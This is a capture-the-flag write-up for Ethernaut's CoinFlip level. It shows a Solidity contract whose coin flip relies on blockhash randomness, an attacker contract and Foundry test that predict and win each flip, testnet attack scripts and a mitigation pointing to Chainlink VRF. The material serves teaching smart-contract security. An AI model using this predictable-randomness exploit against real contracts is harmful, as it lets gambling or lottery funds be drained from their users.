# Level 3: CoinFlip

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)

**Description**:

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

`Text after completing the level`:

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](https://medium.com/coinmonks/simple-oraclize-example-with-solidity-68b6811902da)).

**Code**:

The smart contract to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

</details>

# Findings

### [H-1] Weak randomness in `CoinFlip::flip` allows anyone to always win the flip

**Description**: The `CoinFlip::flip` is using a calculation that is public, so anyone can use the same calculation to guess the next flip result. In fact, the user would have to run the `CoinFlip::flip` many times to have consecutive wins due tho the comparison `lastHash == blockValue` that requires the address to execute the function in different block numbers. But even this way, the entrant can execute `CoinFlip::flip` many times where each of this times he/she wins.

**Impact**: Anyone can manage to always win the flip in this protocol.

**Proof of Code**: One way of doing this is to create another contract that implements the same calculation strategy, so we can calculate what will be the next flip result and then play the flip sequentially.

<details>
<summary>See ContractAttacker Code</summary>

```javascript
// CoinFlipAttacker.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip{
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
  address victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) {
    victim = _coinFlip;
  }

  function guess() internal view returns(bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return side;
  }

  function attack() public {
    bool _guess = guess();
    ICoinFlip(victim).flip(_guess);
  }
}
```

</details>

<details>
<summary>See Test Code</summary>

A snippet of `CoinFlipAttack.t.sol`. The `vm.roll(i)` simulates the `block.number` update to `i` inside the foundry test suit. In this code, we can manage to win 10 times.

```javascript
function testShouldWinTenTimes() public{
  for(uint i=1;i<=10;i++){
    vm.roll(i);
    coinFlipAttacker.attack();
  }
  
  uint256 consecutiveWins = coinFlip.consecutiveWins();

  assertEq(consecutiveWins, 10);
}
```

</details>

**Recommended Mitigation**: Generating random numbers only using Solidity features is not actually recommended, there is always a way to manipulate to someones benefit. One of the recommendations is to use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number). Chainlink provide oracles that we can use to generate random numbers using some off-chain techniques, see the Chainlink docs for more details.

# Attack

**Description**: The attack was made using the `CoinFlipAttacker.sol` contract created. We first deploy this contract, then call attack 10 times (`make attack` 10 times). Basically this is the main `CoinFlipAttack.s.sol` code:

```javascript
  vm.startBroadcast(attacker);

  // Attack
  coinFlipAttacker.attack();

  vm.stopBroadcast();
```

**Instance used**: [0xaA2bC5e263a1b3BdE313A36Aba01CFd40877EA53](https://sepolia.etherscan.io/address/0xaA2bC5e263a1b3BdE313A36Aba01CFd40877EA53)

**Attacker Contract**: [0x8788f2a0096ce8783b009d2897654054ba6a5b3e](https://sepolia.etherscan.io/address/0x8788f2a0096ce8783b009d2897654054ba6a5b3e)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/address/0x8788f2a0096ce8783b009d2897654054ba6a5b3e)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x38a4e8b07fa3048796d290ef61bfbeca6702a036235a1090ddd290f9abfb0280)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Deploy Attacker contract (testnet)

```bash
make deploy
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```